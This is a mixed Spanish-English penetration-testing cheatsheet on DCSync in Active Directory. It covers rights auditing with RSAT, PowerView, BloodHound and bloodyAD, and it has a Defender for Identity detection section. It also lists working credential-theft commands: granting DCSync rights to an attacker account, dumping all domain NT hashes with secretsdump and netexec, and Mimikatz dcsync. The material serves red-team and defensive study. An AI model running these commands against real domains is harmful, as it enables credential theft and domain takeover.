---
aliases:
  - DCSync Tooling
  - secretsdump
  - Mimikatz dcsync
  - PowerView DCSync
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - DCSync Rights Discovery]]"
  - "[[BloodHound & SharpHound]]"
  - "[[Impacket Toolkit]]"
---
# AD - DCSync Rights Discovery - Tooling

***

## RSAT / PowerShell

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-Acl "AD:..."` | Domain root ACL | Standard. |
| `(Get-Acl "AD:...").Access` | Filter for DCSync GUIDs | Standard. |
| `Get-ADObject -Properties nTSecurityDescriptor` | Raw SD | Standard. |
| `dsacls "DC=dom,DC=local"` | Native CLI | Standard. |
| `dsacls "..." | findstr Replicat` | Filter | Standard. |
| `Set-Acl "AD:..." $acl` | Modify (privileged) | Privileged. |
| `Get-ADUser krbtgt -Properties pwdLastSet` | krbtgt age | Adjacent. |
| `Get-ADGroupMember "Domain Admins" -Recursive` | Recursive priv | Adjacent. |
| `Get-ADTrust` | Cross-trust audit | Adjacent. |
| Modern PowerShell preferred | Standard | Standard. |
| Cross-correlate with PowerView | Adjacent | Standard. |
| OPSEC: native less suspicious | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
| Forest-wide via foreach | Standard | Adjacent. |
| Detection: ACL modify events | Defender | Adjacent. |
| Detection: replication queries | Defender | Adjacent. |
^ad-dcsynctool-rsat

### RSAT DCSync audit

```powershell
$dcsyncRights = @(
  "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
  "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
)

# Domain root DCSync ACEs
Get-Acl "AD:$((Get-ADDomain).DistinguishedName)" |
  Select -ExpandProperty Access |
  Where {$_.ObjectType -in $dcsyncRights} |
  Select IdentityReference,ObjectType,InheritanceType
```

___

## PowerView (Adversary)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-DomainObjectAcl -DistinguishedName "DC=dom,DC=local" -ResolveGUIDs` | Resolved DACL | Standard. |
| Filter `ObjectAceType -match "Replicating"` | DCSync filter | Standard. |
| `Find-InterestingDomainAcl -ResolveGUIDs` | Pre-filter | Adjacent. |
| `Add-DomainObjectAcl` | Modify (privileged) | Privileged. |
| `Remove-DomainObjectAcl` | Modify (privileged) | Privileged. |
| pywerview Linux equivalent | Adjacent | Adjacent. |
| Cross-correlate priv group | Standard | Audit. |
| Recursive group expansion | Adjacent | Adjacent. |
| Bulk forest-wide | Adjacent | Standard. |
| Custom function wrappers | DIY | Edge. |
| OPSEC: in-memory load | Defender evasion | Adjacent. |
| Detection: PowerView signatures | Defender | Adjacent. |
| Modern: BloodHound preferred | Standard | Tool. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cleanup: post-engagement | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
^ad-dcsynctool-powerview

### PowerView DCSync audit

```powershell
Import-Module .\PowerView.ps1

# Find DCSync ACEs on domain root
Get-DomainObjectAcl -DistinguishedName "DC=dom,DC=local" -ResolveGUIDs |
  Where {$_.ObjectAceType -match "Replicating Directory Changes"} |
  Select IdentityReferenceName,ObjectAceType
```

___

## BloodHound / SharpHound

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Default collection (incl. ACL) | `SharpHound -c Default` | Standard. |
| ACL-focused | `SharpHound -c ACL` | Targeted. |
| All collection | `SharpHound -c All` | Slow. |
| RustHound (Linux) | `rusthound -d dom -u u -p p --zip` | Modern. |
| BloodHound.py | `bloodhound-python -c All` | Linux. |
| Cypher: DCSync paths | Standard | Tool. |
| Visual graph | Per-edge | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| BHCE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| Pre-built DCSync queries | Standard | Tool. |
| Cross-domain analysis | Forest-wide | Adjacent. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: BHCE CE 6.x recommended | Standard | Tool. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
| Compliance: continuous audit | Standard | Adjacent. |
^ad-dcsynctool-bh

### BloodHound recipes

```bash
# Linux full collection
bloodhound-python -d dom.local -u user -p pass -ns DC -c All --zip

# RustHound
rusthound -d dom.local -u user -p pass --zip
```

```cypher
// Find non-default DCSync principals
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain)
WHERE NOT n.name IN ["DOMAIN ADMINS@DOM.LOCAL", "ENTERPRISE ADMINS@DOM.LOCAL",
                      "ADMINISTRATORS@DOM.LOCAL", "DOMAIN CONTROLLERS@DOM.LOCAL"]
RETURN n.name, type(r), d.name
```

___

## bloodyAD (Linux)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `bloodyAD --resolve-sd` | Decoded SDDL | Standard. |
| `bloodyAD ... add genericAll target principal` | Grant (privileged) | Privileged. |
| `bloodyAD ... add owner target principal` | WriteOwner | Privileged. |
| `bloodyAD ... search "(filter)" --resolve-sd` | Bulk audit | Standard. |
| Linux-friendly | Standard | Standard. |
| Authenticated NTLM/Kerberos | Standard | Standard. |
| LDAPS support | Modern | Standard. |
| Cross-domain | Per-domain | Adjacent. |
| Output: SDDL decoded | Readable | Standard. |
| Cross-platform: Python | Standard | Standard. |
| Modern Linux preferred | Standard | Standard. |
| Detection: bulk LDAP modify | Defender | Adjacent. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cleanup: revert modifications | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
^ad-dcsynctool-bloodyad

### bloodyAD DCSync audit

```bash
# Domain root SDDL
bloodyAD --host DC -d dom -u user -p pass \
  get object "DC=dom,DC=local" --resolve-sd | \
  grep -E "1131f6aa|1131f6ad"

# Add DCSync rights (privileged abuse)
bloodyAD --host DC -d dom -u attacker -p pass \
  add dcsync attacker
```

___

## DCSync Execution Tools

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Impacket secretsdump | `impacket-secretsdump dom/admin:pass@DC -just-dc` | Standard Linux. |
| Mimikatz dcsync | `lsadump::dcsync /domain:dom.local /user:krbtgt` | Standard Windows. |
| Mimikatz alternative | `lsadump::lsa /patch /name:user` | Adjacent. |
| `secretsdump --just-dc-user` | Per-user | Stealthier. |
| `secretsdump --just-dc-ntlm` | Filter NTLM only | Standard. |
| `secretsdump -hashes :NTHASH` | PtH-based DCSync | Adjacent. |
| Crackmapexec / netexec | `nxc smb DC -u u -p p --ntds` | Wrapper. |
| `nxc smb DC -u u -p p --ntds drsuapi` | DRSUAPI mode | Standard. |
| `nxc smb DC -u u -p p --ntds vss` | VSS mode (snapshot) | Adjacent. |
| `nxc ldap DC -u u -p p --dcsync` | netexec direct | Standard. |
| Mimikatz + Rubeus combo | Adjacent | Adjacent. |
| Detection: DRSUAPI from non-DC | Defender | Adjacent. |
| Detection: bulk hash dump | Defender | Adjacent. |
| Modern Defender for Identity DCSync alert | Modern | Defender. |
| Cleanup not needed (read-only) | Standard | OPSEC. |
| OPSEC: per-user vs bulk | Trade-off | OPSEC. |
^ad-dcsynctool-execution

### DCSync execution

```bash
# Linux Impacket (most common)
impacket-secretsdump dom.local/admin:pass@DC -just-dc

# Output: all NT hashes including krbtgt + service accounts
# Format: user:RID:LM:NT:::

# Per-user
impacket-secretsdump dom.local/admin:pass@DC -just-dc-user krbtgt

# With NT hash auth
impacket-secretsdump -hashes :NTHASH dom.local/user@DC -just-dc

# netexec wrapper
nxc smb DC -u admin -p pass --ntds drsuapi
```

```cmd
:: Mimikatz (Windows)
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:dom.local /user:krbtgt /csv

:: All users (slow)
mimikatz # lsadump::dcsync /domain:dom.local /all /csv
```

___

## Linux / Impacket Helpers

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| `bloodhound-python -c All` | Linux BH collector | Standard. |
| `windapsearch --custom` | Adjacent | Edge. |
| `ldapdomaindump` | HTML report | Standard. |
| `nxc ldap DC --query` | Custom LDAP | Adjacent. |
| `pywerview get-objectacl` | Linux PowerView | Adjacent. |
| `bloodyAD` | LDAP modify | Privileged. |
| Custom Python ldap3 | DIY | Standard. |
| `impacket-secretsdump --just-dc` | DCSync execution | Standard. |
| `impacket-ntdsutil` | Edge | Edge. |
| `kerberos toolkit` | Adjacent | Adjacent. |
| Detection: bulk Linux DCSync | Defender | Adjacent. |
| Modern: BHCE preferred | Standard | Tool. |
| Adjacent: DCSync hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
| Cross-correlate with priv tier | Standard | Audit. |
^ad-dcsynctool-linux

### Linux pipeline

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"
DOM="dom.local"

# 1. ACL audit (read-only)
bloodyAD --host $DC -d $DOM -u $USER -p $PASS \
  get object "DC=dom,DC=local" --resolve-sd

# 2. BloodHound collection
bloodhound-python -d $DOM -u $USER -p $PASS -ns $DC -c All --zip

# 3. DCSync execution (with priv creds)
impacket-secretsdump $DOM/admin:adminpass@$DC -just-dc-user krbtgt
```

___

## Microsoft Defender for Identity

| **Capability** | **Detection** | **Notas** |
|:---:|:---:|:---:|
| Real-time DCSync alert | Standard | Modern. |
| Suspicious replication request | Direct | Defender. |
| Source IP analysis | DC-only whitelist | Standard. |
| ML anomaly detection | Modern | Defender. |
| Honeytoken accounts | Defender plant | Detection. |
| krbtgt access alert | Critical | Defender. |
| Service account replication anomaly | Modern | Defender. |
| Cross-trust replication | Critical | Defender. |
| Per-quarter compliance reports | Standard | Adjacent. |
| Continuous monitoring | Modern | Standard. |
| Microsoft Sentinel integration | SIEM | Modern. |
| Custom alert rules | Defender | Adjacent. |
| Compliance baseline | Standard | Adjacent. |
| Audit log retention | Standard | Adjacent. |
| Investigate flow | Standard | Defender. |
| Cross-correlate with auth events | Standard | Defender. |
^ad-dcsynctool-defender

### Defender for Identity setup

```
Microsoft Defender for Identity:
1. Install sensor on Domain Controllers
2. Enable DCSync detection rules (default)
3. Configure honeytoken accounts (decoy DA)
4. Alert on:
   - Suspicious replication request
   - DCSync from non-DC IP
   - krbtgt password access
   - Service account replication anomaly
5. Integrate with Microsoft Sentinel SIEM
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - DCSync | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync` | Reference. |
| The Hacker Recipes - DCSync | `thehacker.recipes/ad/movement/credentials/dumping/dcsync` | Comprehensive. |
| ADSecurity (Sean Metcalf) | `adsecurity.org` | Defender intel. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| Impacket secretsdump | `github.com/fortra/impacket` | Tool. |
| Mimikatz dcsync | `github.com/gentilkiwi/mimikatz` | Tool. |
| Microsoft DRSUAPI | learn.microsoft.com | Vendor. |
| Microsoft Defender for Identity | `learn.microsoft.com/en-us/defender-for-identity/` | Modern detection. |
| PingCastle | `www.pingcastle.com` | Audit tool. |
| Purple Knight | `www.semperis.com/purple-knight/` | Audit tool. |
| MITRE ATT&CK T1003.006 | DCSync technique | Framework. |
| `awesome-active-directory` | GitHub | Foundation. |
| Compliance: NIST 800-53 | Standard | Adjacent. |
| BloodHound DCSync Cypher | Specter Ops | Tool docs. |
| Compass Security queries | Reference | Standard. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
^ad-dcsynctool-resources

***
